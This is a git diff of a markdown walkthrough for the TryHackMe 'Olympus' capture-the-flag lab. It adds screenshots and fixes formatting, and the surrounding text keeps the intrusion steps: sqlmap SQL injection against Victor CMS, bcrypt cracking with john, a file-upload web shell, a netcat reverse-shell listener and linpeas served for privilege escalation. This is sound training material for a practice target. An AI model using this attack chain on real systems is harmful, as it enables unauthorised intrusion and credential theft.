@@ -23,7 +23,11 @@ Nmap shows hostname olympus.thm so we will quickly add it to our ```/etc/hosts``
 ```
 echo "10.10.160.117 olympus.thm" >> /etc/hosts
 ```
-Now it's time to visit the webpage. There isn't anything interesting. First thing we will do is run gobuster. 
+Now it's time to visit the webpage.
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_main_page.png?raw=true)
+
+There isn't anything interesting. First thing we will do is run gobuster. 
 It shows us webmaster directory.
 
 ```
@@ -38,8 +42,12 @@ It shows us webmaster directory.
 /~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
 ```
 
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_webmaster.png?raw=true)
+
 Upon visiting we see Victor CMS. Searching for exploits reveals that the search field is vulnerable to SQL Injection. 
 We capture the request in burpsuite right click and choose save item. Then we run sqlmap with following flags.
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/burp_request_sql_olympus.png)
 
 ```
 # sqlmap -r r.req --level 5 --risk 3 --batch --dbs                           
@@ -87,13 +95,19 @@ For some reason it's formatted weirdly but now we posses usernames and password 
 to our `/etc/hosts` file because we can see root a zeus users having email adresses @chat.olympus.thm .
 
 We will use john the ripper for the cracking of hashes.
+
 ```
 # john --wordlist=/root/Desktop/rockyou.txt --format=bcrypt hashes.txt
 ```
-Now we can login to the admin panel. I tried everything on this page but nothing seems to have any usefull functionality whatsoever.
+
+Now we can login to the admin panel. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_admin.png?raw=true)
+
+I tried everything on this page but nothing seems to have any usefull functionality whatsoever.
 Time to move on to the chat.olympus.thm. 
 
---chatolympus fotka--
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/chat_olympus.png?raw=true)
 
 If we try to login with the prometheus credentials we will log in into the page. We see conversation between
 zeus and prometheus about upload functionality. They talk about changing file name when it is uploaded. This would be problem
@@ -116,6 +130,7 @@ Now visiting `chat.olympus.thm/uploads47c3210d51761686f3af40a875eeaaea.txt`. Pro
 After uploading the shell we use sqlmap to find the name of the shell. But nothing returned.
 The reason is that sqlmap doesn't update it's queries so we have to add flag `--fresh-queries`.
 Now spin up netcat and visit the file and we got connection back.
+
 ```
 └─# nc -lvnp 1234
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -142,6 +157,7 @@ www-data@olympus:/$ export TERM=xterm
 ```
 
 For privilege escalation we will download linpeas from our python server.
+
 ```
 
 └─# python3 -m http.server 80  
@@ -213,7 +229,8 @@ zeus@olympus:~$ ls
 snap  user.flag  zeus.txt
 ```
 The note says 
-```Hey zeus !
+```
+Hey zeus !
 
 I managed to hack my way back into the olympus eventually.
 Looks like the IT kid messed up again !
